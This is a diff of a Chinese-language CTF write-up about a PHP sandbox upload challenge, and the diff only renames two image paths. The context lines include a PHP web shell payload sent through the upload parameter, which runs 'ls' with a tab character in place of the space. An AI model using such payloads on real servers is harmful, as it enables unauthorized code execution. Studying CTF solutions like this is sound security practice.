@@ -52,7 +52,7 @@ switch($_GET["action"] ?? "") {
 
 给了沙盒路径，访问`?action=pwd`就可以看到
 
-![](<../.gitbook/assets/image (6).png>)
+![](<../.gitbook/assets/image (6) (1).png>)
 
 然后`?action=upload&data=`是将data写入到沙盒中，访问`sandbox/cc551ab005b2e60fbdc88de809b2c4b1/index.php`就可以看到
 
@@ -76,7 +76,7 @@ switch($_GET["action"] ?? "") {
 ?action=upload&data=<?=system("ls%09/")?>
 ```
 
-![](<../.gitbook/assets/image (25).png>)
+![](<../.gitbook/assets/image (25) (1).png>)
 
 ## 小结
 
